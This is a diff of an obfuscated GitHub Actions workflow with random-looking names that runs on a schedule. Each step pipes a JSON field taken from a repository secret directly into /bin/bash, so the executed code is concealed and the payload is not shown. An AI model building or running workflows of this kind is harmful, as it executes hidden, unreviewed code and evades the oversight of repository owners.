@@ -1,24 +1,24 @@
 name: jiangzehong1293
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '0 5/6 * * *'
+    - cron: '54 5/6 * * *'
 
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: jiangzehong1293
         env:
-          yguai23: ${{ secrets.yguai23 }}
+          eiuwr3320: ${{ secrets.eiuwr3320 }}
         run: |
-          echo $yguai23 | jq -r .khpos48199 | /bin/bash
-          echo $u561 | jq -r .hz0 | /bin/bash
-          echo $qfq3 | jq -r .lh763 | /bin/bash
-          echo $r7 | jq -r .tai029 | /bin/bash
-          echo $m7 | jq -r .mh048 | /bin/bash
-          echo $q4128 | jq -r .zcl98951 | /bin/bash
-          echo $jwbmm8 | jq -r .ve2647 | /bin/bash
+          echo $eiuwr3320 | jq -r .hi863 | /bin/bash
+          echo $tteu3 | jq -r .ck98 | /bin/bash
+          echo $dwp78381 | jq -r .z52 | /bin/bash
+          echo $t0058 | jq -r .gg39 | /bin/bash
+          echo $jh4528 | jq -r .ix312 | /bin/bash
+          echo $eze99706 | jq -r .ifgab333 | /bin/bash
+          echo $ame086 | jq -r .nrfoy6 | /bin/bash
 
